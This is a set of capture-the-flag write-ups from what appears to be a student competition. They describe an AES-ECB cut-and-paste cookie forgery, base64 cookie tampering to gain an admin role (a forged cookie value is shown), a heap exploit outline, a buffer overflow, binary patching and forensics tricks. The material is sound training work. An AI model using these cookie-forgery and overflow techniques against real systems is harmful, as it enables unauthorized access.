I had to include an extra `"zzzzzzzzzzzzzzz": ""` key-value pair so that JSON
wouldn't complain about the comma after `administrators"`. Since the author told
`json.dumps` to sort the keys, we can guarantee that `zzzzzzzzzzzzzzz` will come
after `role`.

Next I had to come up with inputs that would result in these plaintext blocks.
These were:
```
xxxxxxx
我_xxxxxx
我_administrators
我"zzzzzzzzzzzzzzz
我":              
我"               
我_}               
我_xxxxxxxxxxxxxxx
```

The last input was needed to generate a full row of padding that the `pkcs7_pad`
function would generate.

Plugging each of these inputs into the website, I recorded the cookie value in
`SESSIONID1`. I then wrote a script to process these cookie values and combine
the relevant blocks into one cookie to rule them all.

[ solve script removed -Andrew ]

After setting my `SESSIONID1` cookie to this value, I was greeted by the flag:
```
osuctf{N3V3r_R0Ll_Y0ur_0wN_CrYP70}
```


-----

Challenge: scoreboard
Write-Up Author: ctf-user-099
The overview of this is: fake a malloc struct, free it using the unchecked index, have it's next return a fake chunk that points to the file address. Then read from that file with `reset` and `show`.
# Super gross solve script
[ solve script removed so we can use this for internal ctf -Andrew]

-----

Challenge: my_favorite_shape
Write-Up Author: ctf-user-088
This challenge was messed up, but very rewarding.

They tell you there are 3 receivers and they give you like 700 data points for received power values at these 3 locations.

Whenever you see three distance related data points you can know that you may be able to use trilateration.
Trilateration is what most people mean to say when they say triangulation.

To do trilateration though you need to get from received power (given) to distance. By assuming that all the receivers have uniform gain at all angles you can use the equation:

Prx=Ptx/(4*pi*R^2)
where R is the radius used in trilateration.

from here you just plot all the points in order. They will spell characters where the 0 power measurements are spaces.

-----

Challenge: Fontana
Write-Up Author: ctf-user-088
1. identify epoch is time, get the time
2. google fontana and find that it is a building with a live camera feed
3. feed br0ke
4. find API documentation
5. POST arguments to get the frame at the time from the epoch

-----

Challenge: subdomain
Write-Up Author: ctf-user-088
1. Use a fuzzer to find subdomains, I used an online fuzzer and found the really long weird subdomain immediately
2. nothing is at subdomain
3. use archive tools to find the flag

-----

Challenge: Ride
Write-Up Author: ctf-user-088
1. recognize that the numbers are Lat-Long
2. format the data into a CSV of Lat,Long\n pairs
3. use online tool to plot lat-long CSV pairs
4. read the map of the result

-----

Challenge: flagbin
Write-Up Author: ctf-user-088
1. Use a fuzzer to find the sitemap xml file
2.  format the file to be only URLs
3.  curl all of the contents of these pages into a single file
4.  look for the key
5.  profit

-----

Challenge: debugger
Write-Up Author: ctf-user-088
1. open the file up and find the string the indicates where to look for the decrypted key
2. set a breakpoint at that address in dbg
3. run until the breakpoint
4. print the variable
5. profit

-----

Challenge: undelete
Write-Up Author: ctf-user-088
1. Open the tar and have a look inside
2. turns out in my tar viewing software it doesnt appear as deleted
3. so just read it
4. profit

-----

Challenge: Cookie Monster Pt. 0
Write-Up Author: ctf-user-088
1. see that you were given a cookie
2. see that it is base64
3. decode it
4. change user to admin
5. put it back in
6. refresh page

-----

Challenge: Postmodern Petri Dish
Write-Up Author: ctf-user-115
All we really need to do is go to:
https://en.wikipedia.org/wiki/Genetic_code#RNA_codon_table

And use the table to do:
```
cca -> P Proline
uua -> L Leucine
gag -> E Glutamic Acid
gcu -> A Alanine
uca -> S Serine
gaa -> E Glutamic Acid
gag -> E Glutamic Acid
gcc -> A Alanine
acc -> T Threonine
uag -> _ STOP (Amber)
aca -> T Threonine
guu -> V Valine
gag -> E Glutamic Acid
ggg -> G Glycine
ggg -> G Glycine
auc -> Isoleucine
gaa -> E Glutamic Acid
ucc -> S Serine
```

This spells out PLEASEEAT_TVEGGIES because the author fucked up, but that's okay, we can guess that it's actually PLEASEEATURVEGGIES.

-----

Challenge: PATCHrick_Star
Write-Up Author: ctf-user-137
patched the binary
```
#!/usr/bin/python3

topatch = [bytes([0xe8, 0x45, 0xfb, 0xff, 0xff]),
           bytes([0xe8, 0xa6, 0xf8, 0xff, 0xff]),
           bytes([0x48, 0x8b, 0x45, 0xe8, 0x48, 0x83, 0xc0, 0x48, 0xc6, 0x00, 0x00]),
           bytes([0xe8, 0x25, 0xfb, 0xff, 0xff]),
           bytes([0xe8, 0xdc, 0xfa, 0xff, 0xff])
          ]

patch_replacement = [#(bytes([0x48, 0x83, 0x7d, 0xf8, 0x00]), bytes([0x48, 0x83, 0x7d, 0xf8, 0x01]))
                    ]

with open('PATCHrick_Star', 'rb') as f:
    c = f.read()

for topatch_bytes in topatch:
    patch = b'\x90'*len(topatch_bytes)
    c = c.replace(topatch_bytes, patch)

for t, p in patch_replacement:
    c = c.replace(t, p)

with open('PATCHrick_Star.pat', 'wb') as f:
    f.write(c)

```

-----

Challenge: YaffSquatch
Write-Up Author: ctf-user-137
Yaffsquatch
unsquashfs good_words.bin
cd squashfs-root
unyaffs2 great_characters.bin great
cd great
ls -S | tr -d '\n' | rev


-----

Challenge: onion
Write-Up Author: ctf-user-137
Onion writeup 

I used gdb with gef to start the process, `search-pattern osuctf{` , dump flag

-----

Challenge: Hash Mash
Write-Up Author: ctf-user-137
I put all of the hashes into https://sha1.gromweb.com/?hash=3e2e95f5ad970eadfa7e17eaf73da97024aa5359

-----

Challenge: authbot
Write-Up Author: ctf-user-137
looked at source, ran undocumented command, auth as admin

-----

Challenge: Appetizing Donut Secret
Write-Up Author: ctf-user-137
strings SECRETS| grep osu

-----

Challenge: No
Write-Up Author: ctf-user-137
ran strings, saw the string that said you lookin for something, then base64 decoded the text near that

-----

Challenge: Cookie Monster Pt. 1
Write-Up Author: ctf-user-053
# Putting Together the Cookie Crumbs
So here we go. The first part of this problem is to look at the source provided. We know that what is being encrypted is JSON, where the only thing we can change is the username. 

session = {
            'name': username,
            'role': 'users'
        }

We also know we need to change the role to administrators.

if session.get('role', 'users') == 'administrators':
            flag_text = current_app.config['FLAG']

It also tells us the type of encryption being used, which is ECB.

cipher = AES.new(key=current_app.config['KEY'],** mode=AES.MODE_ECB**)

If you're me and know nothing about this, you google ECB encryption to find weaknesses and just how it works. Here's good info on all the ways this encryption apparently is horrible: [Why shouldn't I use ECB?](https://crypto.stackexchange.com/questions/20941/why-shouldnt-i-use-ecb-encryption) It being horrible is great news for us! We can use both that each block is encrypted separately and that same plain text = same cipher text. (More on this later.)

Once you have the background info, one of the big things to notice in the source code is that you can't change the key at all and have no clue how it's generated. So this limits the types of attack. Some more googling into ECB attacks, and we find the attack is called a [cut and paste attack](https://braincoke.fr/write-up/cryptopals/cryptopals-ecb-cut-and-paste/). There's a lot of sites about that attack, but that was the one that I found least confusing.

With knowing it's a cut and paste attack, we can now use what we learned about ECB weaknesses. Looking once again at the source, we are given the block size = 16 bytes. 

def pkcs7_pad(data: bytes, **blocksize: int = 16**) -> bytes:

[Note to problem creator: thank you so much for this. My head hurt looking at how to find this.] 
Knowing the block size, it's important to also note that after the ECB encryption that it is base64 encoded too. To be able to split into blocks I found it easiest to convert from the base 64 to hex.

We then need to figure out how to make the blocks we are given fit what we want. With only being able to change the username and needing to make the role administrators, this means we need to trick the encryption into giving us a block with "administrators" that only contains valid JSON. We can do this by pushing the string "administrators" to the second block.

We know the first block starts with:

{'name':'

which is only 9 bytes. We need to get 7 more bytes in this block, and "administrators" to the next block. I thought I could do this by just putting 7 letters before "adminsitrators", but we have a character limit in our login prompt. "administrators" is 16 bytes. Perfect size for its own block, but adding 7 characters to the input gives me more than the 20 character limit. 

To get around the character limit, it's important to know how strings vs JSON behaves. The JSON converts characters such as ' to \' to escape the character. This doubles the characters input into the block. Then inputting ''''administrators gives us (with each bullet being a block:
* {'name':'\'\'\'\
* 'administrators'

So now we have one block and need to figure out what else we need. For 'administrators' to be it's own block, the blocks must be:
* {'name':' *[7 chars]*
* *[7 chars]* ', 'role':
* 'administrators'
* } *[Padding]*

The second and last blocks must be formatted that way to ensure 'administrators' is it's own block. This means we need to input something to get } on its own. It ended up being:
* {'name':' *[7 chars]*
* *[1 char]* ,'role':'users'
* }

Then we have the last two blocks of hex for final output. We just need to grab the first two lines which looks the same as above:
* {'name':' *[7 chars]*
* *[7 chars]* ', 'role':

We remove the last two blocks of hex, add on the hex we found, and then encode in base64. We then replace the given cookie with the one we found.

And we are finally done.

Note: I did a lot of this by hand and copying/pasting. This was the ***WRONG*** idea. Scripting can make this a lot easier. One way to do this is by modifying their source code to create a script with your own hard coded key to find the right blocks and make sure you have it correctly. This would have made my life easier. Instead a copy/paste error added about another hour onto my solving this.



-----

Challenge: Not Quite Quine
Write-Up Author: ctf-user-028
# Yes. Yes they are.

Step 1 was, as always, to google what a "quine" is. It's a piece of code that copies itself... huh.
Step 2 was to sit down and dissect that python script, and in particular that print statement. That is one *dense* line of code, so I wrote it out by hand and, piece by piece, wrote down what each section meant. (I have like 5 more tabs open in Google searching for all of the different functions used in there.)
Step 3 was to realize that this code would copy itself by using the variables to reference portions of itself. So I copy/pasted the entire body of code into the variable *s*, making some minor edits like "s={s}" and "f={f}" so that the format() function would recognize each one as a variable. 
Step 4 was to run it and tweak that string it until I got the flag. (Also I apparently needed a newline at the end. I don't think it came with that, but I could have just accidentally deleted it.)

-----

Challenge: Logo
Write-Up Author: ctf-user-056
Logo Stuff

We opened the file and found this SICK logo. Upon inspection it didn't look like much and gave up. After our cap took a look at it, he noticed that the center white area was not entirely white. This was due to his crappy monitor. Open the file in paint, grab the black paint bucket, spill black paint all over the background shows the flag clearly on the screen. Nice! The only flag we could solve.

-----

Challenge: undelete
Write-Up Author: ctf-user-056
Undelete more like Un

Downloading the file we realized that this was a winky weird file with .tar.gz.  Never seen this file so we looked to our brother google for assistance. Really smart fello I must say. Apparently .gz is like a zip file that can be opened through gzip. We initially didn't know how to view files in linux using cat so we opened the file in notepad and poof, there the flag was given to us by the best company Battelle along with giberish cause we were using notepad.

-----

Challenge: Hash Mash
Write-Up Author: ctf-user-036
Through a brief search no examples of hashes with underlines was found,  when comparing the different strings between underlines, they are all 40 characters long, the same length as a SHA-1 hash, when reversed using the site https://md5hashing.net/hash the result of all the hashes with underline spacing denoting the separate hashes is "potato_hash_is_good_with_salt"

-----

Challenge: Cookie Monster Pt. 0
Write-Up Author: ctf-user-056
Nom Nom Cookies

This was a pretty cool website, all it had was a login text box and since I didn't know webscraping and other cool stuff I looked at the source code.  Looking at the code, I didn't understand how the website worked but the creator thought of people like me and added comments. Shout out to the creator. I noticed that we reach the flag.html part after it brings the error message of you must be a admin so we changed the cookie to the base 64 encryption of  "{"name":"admin","role":"admin"}" to get "eyJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==". Refreshing the page we get the flag, woo!

-----

Challenge: Postmodern Petri Dish
Write-Up Author: ctf-user-067
Dang I'm so glad I still remember bio stuff
Sequences of 3 nucleotides will get translated to particular proteins. After some digging around, I noticed that the charts describing amino-acid-to-protein conversions (such as this one: [http://2.bp.blogspot.com/-SW0Fnc0Bsb8/URutxvDAaEI/AAAAAAAAAVM/0rsFvgUug1k/s1600/url.jpg](http://)) also included letters that were used to abbreviate the protein. Translating chunks of 3 nucleotides to the associated letter for its protein yielded PLEASEEAT[STOP]RVEGGIES. After some guesswork (and a hint from the officers), it wasn't too hard to figure out what letter [STOP] should be replaced with.

-----

Challenge: Ride
Write-Up Author: ctf-user-028
I wrote a python script that took in the numbers from the input file and mapped them to x and y coordinates. Then I plotted it using the matplotlib.pyplot module. The resulting plot was upside-down, so I inverted all of the y coordinates. Then I got my answer. (It was barely legible, but I got it!)

-----

Challenge: Hash Mash
Write-Up Author: ctf-user-028
# Google makes things easy
I realized immediately that this was multiple hashes separated by underscores. As I highlighted the first hash to copy it, my browser helpfully offered to search Google for this text. I chose that option. That led me to a SHA-1 reversing website, which told me both the type of hash and what it contained. I went through each hash, eventually putting together the entire message. (Had a bit of a slip-up when I skipped over one of the hashes in the middle, but I got there in the end.)

-----

Challenge: debugger
Write-Up Author: ctf-user-057
Go to https://www.onlinegdb.com/, paste the code in there.
Next to the line number, click until you see a red dot. (Known as a break point before the line(s) that delete the flag).
Start debugger, click start then you can see variable values in the variable list.

What this does is it pauses the execution so that you can see the flag before it gets removed.

-----

Challenge: debugger
Write-Up Author: ctf-user-120
# Simple use of GDB. 
First open GDB with command 

gdb pwn

Which then opens gdb. We need to set a break point after the flag is decrypted but before it is deleted. Let's check the source code. 

> cat pwn.c

We see line 8 is where we need a break. Going into gdb...

>break pwn.c:8


>run 


Now the program has stopped where we want it to. Simply print the flag and we are done!
>print decrypted_flag

-----

Challenge: Postmodern Petri Dish
Write-Up Author: ctf-user-052
Hiding a message in gene expression
The chain of rna given is 108 letters long. 
Separate the letters in groups of threes, and then read it like a ribosome would, mapping it to amino acids

Scientifically, each amino acid is given a letter. read this out.
The word that you get is "PLEASEEAT-TVEGGIES"
However, this doesn't work. And the message doesn't make sense.
A clue in the challenge is that the people looking at it gave up.
A message and phrase that would make sense is please eat your veggies. so change the "-T" portion in the middle to UR and boom.

-----

Challenge: Magic Magic Bytes
Write-Up Author: ctf-user-120
Opened the file in a Hex editor. Noticed strings that mentioned not_a_text_file.zip and not_a_zip_file.txt. Changed related extentions to reveal plain text flag.

-----

Challenge: No
Write-Up Author: ctf-user-067
Basically Found This One By Luck
My original idea was that one of the component's PDF specifications was altered in some way, making it invisible to the PDF reader. Thus, I opened up No.pdf in a hex editor and scanned through the PDF specifications. Around where the author is defined, there is a string embedded that says "You looking for something?", followed by a jibberish-looking string. After decoding that jibberish-looking string in base64, the flag was revealed.

-----

Challenge: what_even_is_a_cornhusker
Write-Up Author: ctf-user-120
# What fun
GIMP and xxd revealed nothing so tried steghide. 

Had to use steghide extract -sf flag.jpg
the passphrase was the challange name. 
Key was then reveled. 

-----

Challenge: Logo
Write-Up Author: ctf-user-120
# Magic Contrast
It was all in the contract of the image. I use a slightly different method. By changing the alpha of just the white text I was able to find slightly off colored text in the middle of the image which was the flag.

-----

Challenge: Tripped Over a String
Write-Up Author: ctf-user-120
# HEX FTW
Used a hex editor since nothing else was able to open the file.  Manual looked through it to find the flag. Next time use 


xxd tripped_over_a_string | grep osuctf

-----

Challenge: subdomain
Write-Up Author: ctf-user-067
So Apparently Subdomain Finders Are A Thing
^^Interesting factoid I did not know before today. I found the subdomain by using a subdomain finder (NMMapper) on osucyber.club, while my partner found it by searching for certificates belonging to osucyber.club. After that, he downloaded the archives on 9vyloyc3ojspmtuhtm6ejq.osucyber.club and used `grep` to search for the flag.

-----

Challenge: cord-great_white
Write-Up Author: ctf-user-082
Open the file in wire shark, I then ordered the network packets by protocol. I then noticed flag.png. I then went to file- export objects then selected flag.png. And there it was.

-----

Challenge: Right Address
Write-Up Author: ctf-user-028
# Taught me some shell scripting to boot.
After examining the compiled ELF file in Radare2, I found the address of the "print_spy_instructions" method. I then used echo to redirect a string containing a lot of filler characters followed by the correct ones into a holder file. (This taught me how to use BASH for loops.) Then I sent it to the osuctf server with cat and a pipe. 
Unfortunately, I hadn't calculated my buffer size exactly right, and trying values nearby only resulted in frustration. I eventually got fed up with having to re-enter all the commands to fill my holder text file, and I wrote a shell script to do it that took in the number of buffer characters as a parameter. After running this several times, I finally managed to get the right value.
Sidenote, but it seems if you exceed your character limit in fgets(), it makes the gets() function able to avoid the buffer overflow issues. Which is interesting. 

-----

Challenge: Appetizing Donut Secret
Write-Up Author: ctf-user-067
If you do `testdisk SECRETS` (with "None" partition),  it will list all the files that had been deleted on the drive. You can copy all those files out to your current directory and then use `grep` on those files to search for a the flag.

-----

Challenge: Magic Magic Bytes
Write-Up Author: ctf-user-056
Magic Magic Bytes!

Magic Bytes symbolize the endings of files like .pdf .jpg etc. The file given through file analysis resembles it to be a zip file. Turning that into the zip and extracting it gives the flag. Ez pz lemon squeegee

-----

Challenge: Tripped Over a String
Write-Up Author: ctf-user-056
Tripped Over a STR

Really clever name I must say. Download the file, change it to .txt and read the strings. We initially renamed the file to .txt and just used ctr f to find the tag before discovering the power of LINUX!

-----

Challenge: Cookie Monster Pt. 0
Write-Up Author: ctf-user-004
Cookie Monster Pt. 0 Write up

I started by looking through the source code given by a login attempt.  It shows a check for "admin" on the entered username. So i entered a username and decoded the output value using a b64 decoder. The decoded output looked like this:  {"'name': username,  'role': 'users'}. So I replaced 'users' with 'admin' and encoded it. I then replaced the cookie value with the new encoded value and refreshed the page.

-----

Challenge: debugger
Write-Up Author: ctf-user-067
Using `gdb` on the c file, one can add in a break point on line 10 (`br 10`), where the bytes have been decrypted and not yet wiped. Run the code and when it stops, run `print arr` to get the flag.

-----

